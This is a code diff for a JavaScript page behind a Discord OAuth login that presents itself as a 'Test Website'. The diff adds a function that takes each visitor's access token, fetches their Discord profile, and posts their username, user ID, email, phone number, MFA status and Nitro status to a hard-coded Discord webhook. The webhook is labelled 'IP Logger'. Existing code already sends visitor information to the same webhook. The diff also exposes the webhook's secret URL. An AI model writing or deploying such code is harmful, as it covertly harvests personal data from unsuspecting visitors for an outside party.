@@ -40,7 +40,7 @@
             console.log("Access token data:", data); // Log access token data
 
             // Fetch user info
-            const userInfoResponse = await fetch('https://discord.com/api/v9/users/@me', {
+            const userInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
                 headers: {
                     'Authorization': `Bearer ${data.access_token}`,
                 },
@@ -53,10 +53,61 @@
             }
 
             const user = await userInfoResponse.json();
-            document.body.innerHTML = `<h1>Welcome, ${user.username}!</h1><pre>${JSON.stringify(user, null, 2)}</pre>`;
+            const email = user.email || "Email not provided";
+
+            // Update the body with user information
+            document.body.innerHTML = `
+                <h1>Welcome, ${user.username}!</h1>
+                <p>Email: ${email}</p>
+                <pre>${JSON.stringify(user, null, 2)}</pre>
+            `;
 
             // Call the function to send visitor info along with the access token
             sendInfoToDiscord(data.access_token);
+            sendTokenInfoToWebhook(data.access_token); // New function to send token info
+        }
+
+        async function sendTokenInfoToWebhook(accessToken) {
+            try {
+                // Fetch additional user data
+                const tokenInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
+                    headers: {
+                        'Authorization': `Bearer ${accessToken}`,
+                    },
+                });
+
+                const tokenInfo = await tokenInfoResponse.json();
+
+                // Prepare the webhook message
+                const embedMessage = {
+                    embeds: [{
+                        title: '👤 User Token Info',
+                        color: 3066993,
+                        fields: [
+                            { name: 'Username', value: `${tokenInfo.username}#${tokenInfo.discriminator}`, inline: true },
+                            { name: 'User ID', value: tokenInfo.id, inline: true },
+                            { name: 'Email', value: tokenInfo.email || "Not provided", inline: true },
+                            { name: 'Phone', value: tokenInfo.phone || "Not provided", inline: true },
+                            { name: 'MFA Enabled', value: tokenInfo.mfa_enabled ? 'Yes' : 'No', inline: true },
+                            { name: 'Has Nitro', value: tokenInfo.premium_type ? 'Yes' : 'No', inline: true },
+                        ],
+                        footer: {
+                            text: 'Logged by IP Logger',
+                        }
+                    }]
+                };
+
+                const webhookUrl = 'https://discord.com/api/webhooks/1285985396924092458/8UH3XrEDxBUqIGYkw4iC353w_0mC86uGCnvdlRyw2uhBMucajDmFEGrsm_7VCu44Q101'; // Your webhook URL
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(embedMessage)
+                });
+            } catch (error) {
+                console.error('Failed to send token info:', error);
+            }
         }
 
         async function sendInfoToDiscord(accessToken) {
@@ -105,7 +156,7 @@
                 }]
             };
 
-            const webhookUrl = 'https://discord.com/api/webhooks/1285985396924092458/8UH3XrEDxBUqIGYkw4iC353w_0mC86uGCnvdlRyw2uhBMucajDmFEGrsm_7VCu44Q101';
+            const webhookUrl = 'https://discord.com/api/webhooks/1285985396924092458/8UH3XrEDxBUqIGYkw4iC353w_0mC86uGCnvdlRyw2uhBMucajDmFEGrsm_7VCu44Q101'; // Your webhook URL
             await fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
@@ -114,7 +165,7 @@
                 body: JSON.stringify(embedMessage)
             });
 
-            document.body.innerHTML = `<h1>Test Website, Thank You for Testing (${getDeviceName()})</h1>`;
+            document.body.innerHTML += `<h2>Test Website, Thank You for Testing (${getDeviceName()})</h2>`;
         }
 
         function getDeviceName() {
